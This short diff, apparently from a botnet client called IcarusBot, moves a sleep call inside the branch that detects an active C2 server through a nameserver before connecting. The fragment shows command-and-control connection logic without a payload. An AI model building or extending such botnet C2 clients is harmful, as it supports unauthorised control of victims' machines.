@@ -66,7 +66,7 @@ class IcarusBot:
                 if self.c2_server_details[0] != 'not_active' and self.c2_server_details[1] != 'not_active':
                     # there is a server available, let's go ahead and connect, ignoring the nameserver again until they disconnect.
                     nameserver_available = True
-                time.sleep(5)
+                    time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
             print("nameserver found")
             notification("CONNECTED")
